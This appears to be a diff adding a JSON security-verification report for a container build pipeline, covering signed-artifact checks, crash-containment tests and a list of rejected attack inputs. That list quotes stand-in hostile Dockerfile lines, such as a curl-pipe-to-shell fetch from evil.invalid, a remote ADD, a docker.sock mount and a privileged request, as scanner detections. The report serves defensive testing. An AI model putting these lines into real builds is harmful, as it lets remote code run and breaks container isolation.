+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:a67952c91aeb2379d6d5a755ae38bee9f2c01294ea9b90856a78d8358eb9510c",
+            "reasons": [],
+            "role": "runner"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/b/runner-b.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/b/runner-b.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/b/runner-b.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/b/runner-b.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/b/runner-b.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/b/runner-b.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "runner.b",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:797fc9b8454fe61e268930b655ff3eb82a6d36f6f73d4db984b1148f56bc384b",
+            "reasons": [],
+            "role": "signer"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "signer.a",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:81ce20e06f382adeace0d8baf4fced93746e7486a1854510f0b520148946e3d1",
+            "reasons": [],
+            "role": "signer"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/b/signer-b.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/b/signer-b.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/b/signer-b.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/b/signer-b.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/b/signer-b.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/b/signer-b.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "signer.b",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:aaaf8bc32e549865af47627f7ff9740883515e6a44ab93a276c007dd352870d1",
+            "reasons": [],
+            "role": "verifier"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "verifier.a",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:f5e554174c4851d50206c79b2e633419b6245d73637a0236e4ac64d695adeebd",
+            "reasons": [],
+            "role": "verifier"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/b/verifier-b.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/b/verifier-b.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/b/verifier-b.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/b/verifier-b.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/b/verifier-b.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/b/verifier-b.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "verifier.b",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:d86e94ba4407f03b06bbb83d365cce25d76b17680e84a73a4b1f7639d1d841f1",
+            "reasons": [],
+            "role": "worker"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "worker.a",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:eb8589342fe68beb2e41e017843e2378d5346d33e5ad297980436a74c456fe45",
+            "reasons": [],
+            "role": "worker"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/b/worker-b.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/b/worker-b.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/b/worker-b.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/b/worker-b.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/b/worker-b.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/b/worker-b.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "worker.b",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        }
+      ],
+      "schema_version": "1.0.0",
+      "source_commit": "8ccfa65f8cb53f42e660abd2a2b547edac74250e",
+      "verified_at_utc": "2026-07-18T06:47:31.302448Z"
+    }
+  },
+  "service_runtime": {
+    "anchor": {
+      "container_id": "f77c09a5f50f2c0ab921555fec0398c6f62c0377ea201afad0d11e99c40082ae",
+      "crash": {
+        "containment": {
+          "all_capabilities_dropped": true,
+          "apparmor": true,
+          "cpu_limited": true,
+          "docker_socket_absent": true,
+          "memory_limited": true,
+          "network_none": true,
+          "no_new_privileges": true,
+          "pids_limited": true,
+          "read_only_root": true
+        },
+        "decision": {
+          "case_id": "p4.anchor_crash",
+          "disposition": "CONTAINED",
+          "kind": "anchor_crash",
+          "passed": true,
+          "reasons": []
+        },
+        "observation": {
+          "cancelled": false,
+          "case_id": "p4.anchor_crash",
+          "completed_at": "2026-07-18T07:06:47.010945Z",
+          "container_id": "b486be206b1edf8b19a3427031251fb60caab948ca2212102938bc4f39142826",
+          "evidence": {
+            "detected": true
+          },
+          "exit_code": 134,
+          "host_impact": false,
+          "kind": "anchor_crash",
+          "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+          "oom_killed": false,
+          "schema_version": "1.0.0",
+          "started_at": "2026-07-18T07:06:46.825063Z",
+          "timed_out": false,
+          "unrelated_resources_changed": false
+        },
+        "sanitized_logs": "TARGET|"
+      },
+      "health": {
+        "provider_id": "anchor.p4.runtime",
+        "provider_key_id": "ed25519:cee4da5df952640d71c92bbc2d9bb032",
+        "status": "ok",
+        "storage_root": "/workspace/state/anchor",
+        "storage_separate_from_custody_database": true
+      },
+      "network_mode": "none",
+      "passed": true,
+      "private_key_runtime_mount": true,
+      "read_only_root": true
+    },
+    "custody": {
+      "container_id": "3d1706c23494e4ec6548e8c00eb5e5656c5c34b5dd4e992dbe1e856db063ffef",
+      "crash": {
+        "containment": {
+          "all_capabilities_dropped": true,
+          "apparmor": true,
+          "cpu_limited": true,
+          "docker_socket_absent": true,
+          "memory_limited": true,
+          "network_none": true,
+          "no_new_privileges": true,
+          "pids_limited": true,
+          "read_only_root": true
+        },
+        "decision": {
+          "case_id": "p4.custody_crash",
+          "disposition": "CONTAINED",
+          "kind": "custody_crash",
+          "passed": true,
+          "reasons": []
+        },
+        "observation": {
+          "cancelled": false,
+          "case_id": "p4.custody_crash",
+          "completed_at": "2026-07-18T07:06:38.446611Z",
+          "container_id": "a4b75b2f091eba440e38e74910ca68528fea89117027c3069a43fae95715391b",
+          "evidence": {
+            "detected": true
+          },
+          "exit_code": 134,
+          "host_impact": false,
+          "kind": "custody_crash",
+          "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+          "oom_killed": false,
+          "schema_version": "1.0.0",
+          "started_at": "2026-07-18T07:06:38.203776Z",
+          "timed_out": false,
+          "unrelated_resources_changed": false
+        },
+        "sanitized_logs": "TARGET|"
+      },
+      "health": {
+        "append_only": true,
+        "evidence_root_ready": true,
+        "executes_customer_code": false,
+        "private_verdict_signing_key_loaded": false,
+        "schema_version": 0,
+        "status": "ok",
+        "version": "0.3.0"
+      },
+      "network_mode": "none",
+      "passed": true,
+      "private_key_runtime_mount": false,
+      "read_only_root": true
+    },
+    "signer_crash": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.signer_crash",
+        "disposition": "CONTAINED",
+        "kind": "signer_crash",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.signer_crash",
+        "completed_at": "2026-07-18T07:07:02.149391Z",
+        "container_id": "bbe875502a5529ea21c860f2b12939205b234bb97feee2311c18b2e7ebbe237a",
+        "evidence": {
+          "detected": true
+        },
+        "exit_code": 134,
+        "host_impact": false,
+        "kind": "signer_crash",
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:07:01.881758Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|"
+    },
+    "verifier": {
+      "artifacts": {
+        "attestation": {
+          "read_only": true,
+          "sha256": "9da27435601bdff09815c6ac9da140e27509ae8a5b3021dc19087bca38bbe5ae",
+          "source": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.attestation.json",
+          "target": "/input/runner.attestation.json"
+        },
+        "policy": {
+          "read_only": true,
+          "sha256": "3658b04f0a3164290e317834bcdbb403e56e671dc36f776a3d2b50f96e4384ab",
+          "source": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.admission-policy.json",
+          "target": "/input/runner.admission-policy.json"
+        },
+        "sbom": {
+          "read_only": true,
+          "sha256": "0886ee19641c7c4a30c806893f0633bcfc6c93d4297f3a2af811348482c50679",
+          "source": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.spdx.json",
+          "target": "/input/runner.spdx.json"
+        }
+      },
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "execution_limits": {
+        "memory": "256m",
+        "nofile": 256,
+        "pids": 64,
+        "timeout_seconds": 60,
+        "workspace_size": "8m"
+      },
+      "exit_code": 0,
+      "logs_sha256": "3950c26c1f9dd34e636b4eb8c8894953091baa1ea01604bdcb6f78c5aa99b849",
+      "oom_killed": false,
+      "output": {
+        "admission": {
+          "allowed": true,
+          "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+          "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+          "reasons": [],
+          "role": "runner"
+        },
+        "passed": true,
+        "private_key_loaded": false,
+        "sbom_reason": "verified",
+        "sbom_valid": true,
+        "schema_version": "1.0.0"
+      },
+      "passed": true,
+      "private_key_mounted": false,
+      "sanitized_logs": "TARGET|{\"admission\":{\"allowed\":true,\"attestation_key_id\":\"ed25519:d1a2b83569e5a4d3d33025410088a5fe\",\"image_digest\":\"sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65\",\"reasons\":[],\"role\":\"runner\"},\"passed\":true,\"private_key_loaded\":false,\"sbom_reason\":\"verified\",\"sbom_valid\":true,\"schema_version\":\"1.0.0\"}\nTARGET|",
+      "timed_out": false
+    },
+    "worker": {
+      "container_id": "ec42cfa3ab8f38b72174eedab5a4090af20b8384ff2048a8f2265feb5bb9cfdf",
+      "crash": {
+        "containment": {
+          "all_capabilities_dropped": true,
+          "apparmor": true,
+          "cpu_limited": true,
+          "docker_socket_absent": true,
+          "memory_limited": true,
+          "network_none": true,
+          "no_new_privileges": true,
+          "pids_limited": true,
+          "read_only_root": true
+        },
+        "decision": {
+          "case_id": "p4.worker_crash",
+          "disposition": "CONTAINED",
+          "kind": "worker_crash",
+          "passed": true,
+          "reasons": []
+        },
+        "observation": {
+          "cancelled": false,
+          "case_id": "p4.worker_crash",
+          "completed_at": "2026-07-18T07:07:01.700540Z",
+          "container_id": "d26a21a6694482d232ec9d4f27c6012a2a397ca8762bf33f752e79309e2c0753",
+          "evidence": {
+            "detected": true
+          },
+          "exit_code": 134,
+          "host_impact": false,
+          "kind": "worker_crash",
+          "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+          "oom_killed": false,
+          "schema_version": "1.0.0",
+          "started_at": "2026-07-18T07:06:57.891242Z",
+          "timed_out": false,
+          "unrelated_resources_changed": false
+        },
+        "sanitized_logs": "TARGET|"
+      },
+      "health": {
+        "control_plane_executes_customer_code": false,
+        "private_signing_key_loaded": false,
+        "status": "ok",
+        "version": "0.3.0"
+      },
+      "network_mode": "none",
+      "passed": true,
+      "private_key_runtime_mount": false,
+      "read_only_root": true
+    }
+  },
+  "source_commit": "8ccfa65f8cb53f42e660abd2a2b547edac74250e",
+  "started_at_utc": "2026-07-18T06:47:30.302448Z",
+  "static_attack_matrix": {
+    "archives": {
+      "recursive_archive": {
+        "denied": true,
+        "reason": "nested_archive_not_allowed:inner.zip"
+      },
+      "tar_hardlink": {
+        "denied": true,
+        "exception_type": "IsolationFailure",
+        "expected_reason": "archive_special_member_not_allowed",
+        "reason": "archive_special_member_not_allowed"
+      },
+      "zip_absolute": {
+        "denied": true,
+        "exception_type": "IsolationFailure",
+        "expected_reason": "archive_member_is_absolute",
+        "reason": "archive_member_is_absolute"
+      },
+      "zip_bomb": {
+        "denied": true,
+        "exception_type": "IsolationFailure",
+        "expected_reason": "archive_expanded_size_limit_exceeded",
+        "reason": "archive_expanded_size_limit_exceeded"
+      },
+      "zip_traversal": {
+        "denied": true,
+        "exception_type": "ValueError",
+        "expected_reason": "archive_member_escapes_root",
+        "reason": "artifact path must be relative and may not traverse parents"
+      }
+    },
+    "context_symlink": {
+      "file_count": 1,
+      "findings": [
+        "symlink_forbidden:escape"
+      ],
+      "manifest_sha256": "686739dc37cc8f484712aa46078523c9a8d3170872d80c494dce230931105fb8",
+      "total_bytes": 4,
+      "valid": false
+    },
+    "dockerfiles": {
+      "privilege": {
+        "findings": [
+          {
+            "detail": "RUN echo --privileged CAP_SYS_ADMIN",
+            "line": 2,
+            "rule": "privilege_request_forbidden"
+          }
+        ],
+        "valid": false
+      },
+      "remote_add": {
+        "findings": [
+          {
+            "detail": "ADD https://evil.invalid/payload /payload",
+            "line": 2,
+            "rule": "add_forbidden"
+          }
+        ],
+        "valid": false
+      },
+      "remote_script": {
+        "findings": [
+          {
+            "detail": "RUN curl https://evil.invalid/p | sh",
+            "line": 2,
+            "rule": "remote_script_execution"
+          }
+        ],
+        "valid": false
+      },
+      "root_runtime": {
+        "findings": [
+          {
+            "detail": "USER root",
+            "line": 2,
+            "rule": "root_runtime_user"
+          }
+        ],
+        "valid": false
+      },
+      "socket": {
+        "findings": [
+          {
+            "detail": "VOLUME /var/run/docker.sock",
+            "line": 2,
+            "rule": "docker_socket_forbidden"
+          }
+        ],
+        "valid": false
+      },
+      "unpinned_base": {
+        "findings": [
+          {
+            "detail": "FROM python:3.12",
+            "line": 1,
+            "rule": "unpinned_base"
+          }
+        ],
+        "valid": false
+      }
+    },
+    "host_install_script_marker_absent": true,
+    "source_scan": {
+      "file_count": 5,
+      "findings": [
+        {
+          "detail": "submodule configuration requires explicit policy",
+          "path": ".gitmodules",
+          "rule": "git_submodule"
+        },
+        {
+          "detail": "unresolved Git LFS pointer",
+          "path": "model.bin",
+          "rule": "git_lfs_pointer"
+        },
+        {
+          "detail": "local or SSH dependency reference",
+          "path": "package-lock.json",
+          "rule": "poisoned_lockfile"
+        },
+        {
+          "detail": "postinstall:touch /mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/host-install-script-marker",
+          "path": "package.json",
+          "rule": "package_install_script"
+        },
+        {
+          "detail": "legacy Python build script requires isolated execution policy",
+          "path": "setup.py",
+          "rule": "python_build_script"
+        }
+      ],
+      "total_bytes": 447,
+      "valid": false
+    }
+  },
+  "tools": {
+    "clamav_image": "clamav/clamav@sha256:7f5389ccaa2368c383fa80e167ccfe44348d71e685f926fce4755eed1757673a",
+    "cosign": {
+      "path": "/mnt/storage/forge_cache/echo-certforge/p4-9c07eb7/tools/cosign/cosign",
+      "sha256": "ae1ecd212663f3693ad9edf8b1a183900c9a52d3155ba6e354237f9a0f6463fc"
+    },
+    "trivy": {
+      "path": "/mnt/storage/forge_cache/echo-certforge/p4-9c07eb7/tools/trivy/trivy",
+      "sha256": "0e69edd134a3c338baa1a6806920773615d682b18cbc6a0cba2a3b658ef9b63e"
+    }
+  },
+  "wrapper_return_code": 0
+}
